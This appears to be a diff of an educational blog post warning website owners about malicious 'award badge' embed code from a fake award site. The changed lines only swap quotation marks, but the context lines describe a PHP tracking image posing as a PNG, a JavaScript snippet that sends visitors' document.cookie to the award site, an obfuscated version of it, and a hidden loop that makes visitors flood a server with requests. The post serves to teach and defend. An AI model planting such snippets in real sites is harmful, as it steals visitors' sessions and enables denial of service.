@@ -10,7 +10,7 @@ In part 1, I discussed the various arguments I run into about wanting to be over
 
 <!--more-->
 
-In our scenarios here, we're going to focus on a fake award site called “AwardSite” that gave our victim a winning notification. They are in the top 5% of 2013's best websites. The servers have PHP and are apache servers.
+In our scenarios here, we're going to focus on a fake award site called "AwardSite" that gave our victim a winning notification. They are in the top 5% of 2013's best websites. The servers have PHP and are apache servers.
 
 Perhaps they send an email like this:
 
@@ -52,7 +52,7 @@ In this case, the nefarious hacker wants to determine if this site has a lot of 
 </a>
 ```
 
-Let's break down what the code means, and then show the back-end. First, it is just a link to the awardsite website. The image is the banner that you saw above. Finally, that image has a pretty non-conspicuous get parameter called ‘compress' which is set to the ID in the database of this particular victim site. It was important to use a word that SEEMED somewhat legitimate. Of course compress seems ok, so why would I judge that?
+Let's break down what the code means, and then show the back-end. First, it is just a link to the awardsite website. The image is the banner that you saw above. Finally, that image has a pretty non-conspicuous get parameter called 'compress' which is set to the ID in the database of this particular victim site. It was important to use a word that SEEMED somewhat legitimate. Of course compress seems ok, so why would I judge that?
 
 On the server, however, the file award.png is actually a PHP file. The apache server has configuration, perhaps in the .htaccess file, like this:
 
@@ -82,7 +82,7 @@ This code basically gets the siteID from the GET query. It then grabs the user a
 
 No matter if there's a valid siteID or not, finally the png header gets sent and the real award file is sent to the browser.
 
-In this case, our victim has allowed the “bad guy” to keep track of their visitors, times, and demographics. They can now determine if this is a high traffic site or not – and whether its worth targeting specifically with more sophisticated attacks.
+In this case, our victim has allowed the "bad guy" to keep track of their visitors, times, and demographics. They can now determine if this is a high traffic site or not – and whether its worth targeting specifically with more sophisticated attacks.
 
 ## Cookie Stealing / Session Theft
 
@@ -102,7 +102,7 @@ Here is the source code for the HTML/Javascript from the email:
 
 Here, a new image is created. Then, it is sent to the award.png PHP file. In this case, we grab the entire document.cookie. The cookie can then be parsed from the string of the GET parameter. Finally, the image is added to the file and no one is the wiser.
 
-Of course, this kind of can look a bit bad if you see the words ‘document.cookie' – so we can obscure this a bit. Try this:
+Of course, this kind of can look a bit bad if you see the words 'document.cookie' – so we can obscure this a bit. Try this:
 
 ```javascript
 var s = 'http://awardsite.com/award.png';
@@ -113,7 +113,7 @@ i.src = concat(s,'?c=', j);
 document.getElementById('awardlink').appendChild(i);
 ```    
         
-Of course, it can look bad for our trained eyes... but for those who don't “work on computers” they'll just think its code they don't understand and use it.
+Of course, it can look bad for our trained eyes... but for those who don't "work on computers" they'll just think its code they don't understand and use it.
 
 **For future examples, I won't show how to obfuscate the code. But that would be one of the steps.**
 
@@ -139,7 +139,7 @@ What if we could make the visitor perform a denial of service? That wouldn't be 
 </a>
 ```
 
-In this case, the image is added successfully. However, the `setTimeout()` method executes a different function 3 seconds later. The delay is so that the user won't notice the delay in their browser (hopefully the entire site has loaded by then) – and it puts it in the background. Then, a new ‘image' is created 1000 times and appended to the document – with a hidden display (so the visitor can't tell). But, basically, one visitor to this site, especially if they spent some time just reading the content, loaded 1000 more requests than were necessary.
+In this case, the image is added successfully. However, the `setTimeout()` method executes a different function 3 seconds later. The delay is so that the user won't notice the delay in their browser (hopefully the entire site has loaded by then) – and it puts it in the background. Then, a new 'image' is created 1000 times and appended to the document – with a hidden display (so the visitor can't tell). But, basically, one visitor to this site, especially if they spent some time just reading the content, loaded 1000 more requests than were necessary.
 
 ## Processing Actions as the Victim
 
